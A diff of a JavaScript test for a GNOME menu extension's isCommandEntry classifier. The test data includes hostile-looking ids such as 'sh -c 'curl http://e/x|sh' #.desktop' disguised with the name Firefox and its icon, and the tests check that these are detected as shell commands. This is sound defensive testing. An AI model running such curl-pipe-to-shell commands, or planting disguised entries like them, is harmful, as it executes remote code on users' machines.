@@ -133,10 +133,12 @@ test('restore repairs a damaged pinned structure (duplicates, nested folders) li
 test('isCommandEntry classifies like the launch code', async () => {
     const {isCommandEntry} = await import('../build/core/entries.js');
     for (const [e, inPinned] of [[{id: 'firefox.desktop'}, true], [{id: 'org.gnome.Nautilus.desktop', name: 'Files'}, true], [{id: 'Spawn_Home'}, false],
-        [{id: 'ArcMenu_Home'}, false], [{id: '/home/u'}, false], [{id: 'file:///x'}, false], [{id: 'f1', isFolder: 'true'}, true], [{id: ' '}, false]])
+        [{id: 'ArcMenu_Home'}, false], [{id: '/home/u'}, false], [{id: 'file:///x'}, false], [{id: 'f1', isFolder: 'true'}, true], [{id: ' '}, false],
+        [{id: "sh -c 'x' a.desktop"}, false]])
         assertEquals(isCommandEntry(e, inPinned), false, JSON.stringify(e));
     for (const [e, inPinned] of [[{id: 'gnome-calculator'}, true], [{id: 'sh -c "curl evil|sh"', name: 'Home'}, false],
-        [{id: "sh -c 'x' a.desktop"}, false], [{id: 'xterm', isFolder: 'true'}, false]])
+        [{id: "sh -c 'curl http://e/x|sh' #.desktop", name: 'Firefox', icon: 'firefox'}, true],
+        [{id: "/bin/sh -c 'x' #.desktop", name: 'Firefox'}, true], [{id: 'xterm', isFolder: 'true'}, false]])
         assertEquals(isCommandEntry(e, inPinned), true, JSON.stringify(e));
 });
 
